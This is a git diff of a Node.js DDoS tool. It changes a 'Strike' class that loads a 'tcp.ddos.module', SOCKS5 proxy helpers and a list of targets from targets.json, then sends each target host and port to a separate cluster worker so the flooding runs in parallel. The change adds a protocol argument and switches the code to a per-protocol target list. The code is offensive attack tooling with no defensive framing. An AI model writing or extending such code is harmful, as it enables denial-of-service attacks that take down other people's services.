@@ -9,14 +9,15 @@ const { Agent } = require("socks5-http-client");
 const { socks5 } = require("./proxy.socks5");
 const EventEmitter = require("events");
 const ProxyChecker = require("./proxyChecker");
-const TcpClient = require("./tcp.ddos.module");
+const TcpClient = require("./modules/tcp.ddos.module");
 const targets = require("./targets.json");
 
 class Strike {
+  #protocol = "";
   #CPUsCount = 0;
   #ms = 1000;
 
-  constructor(ms, CPUsCount) {
+  constructor(protocol, ms, CPUsCount) {
     this.counter = 0;
     this.eventEmitter = new EventEmitter();
     this.proxyChecker = new ProxyChecker();
@@ -25,7 +26,7 @@ class Strike {
   }
 
   async init() {
-    const numCPUs = this.#CPUsCount || targets.data.length;
+    const numCPUs = this.#CPUsCount || targets.data.tcp.length;
     let i = 0;
 
     if (cluster.isPrimary) {
@@ -34,7 +35,7 @@ class Strike {
       }
 
       for (const worker of Object.values(cluster.workers)) {
-        const { host, port } = targets.data[i];
+        const { host, port } = targets.data.tcp[i];
         worker.send({ host, port });
         // worker.send({ host: "127.0.0.1", port: 23 });
         i++;
@@ -70,6 +71,6 @@ class Strike {
 }
 
 (function () {
-  const [,, ms, CPUsCount] = process.argv;
-  new Strike(ms, CPUsCount).init();
+  const [,, protocol, ms, CPUsCount] = process.argv;
+  new Strike(protocol, ms, CPUsCount).init();
 })();
